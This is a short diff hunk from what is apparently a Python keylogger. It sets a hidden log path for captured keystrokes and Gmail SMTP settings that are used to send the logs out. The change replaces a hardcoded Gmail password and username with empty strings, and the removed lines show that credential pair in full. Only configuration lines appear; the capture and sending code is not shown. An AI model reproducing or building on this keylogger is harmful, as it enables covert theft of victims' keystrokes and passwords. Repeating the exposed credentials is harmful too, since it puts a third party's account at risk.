@@ -39,8 +39,8 @@ KS_DIR = 'C:\Users\Public\Logs\KeyStrokes\\'
 
 LOG_FILE = KS_DIR + 'KeyStrokes.txt'
 
-passkey = "qdqqfbihhciqefka"  #Password to connect to GMAIL smtp server
-userkey = "moahjuan720@gmail.com"  #Username to connect to GMAIL smtp server
+passkey = ""  #Password to connect to GMAIL smtp server
+userkey = ""  #Username to connect to GMAIL smtp server
 
 buffer = ''
 SMTP_SERVER = "smtp.gmail.com"  #SMTP server address
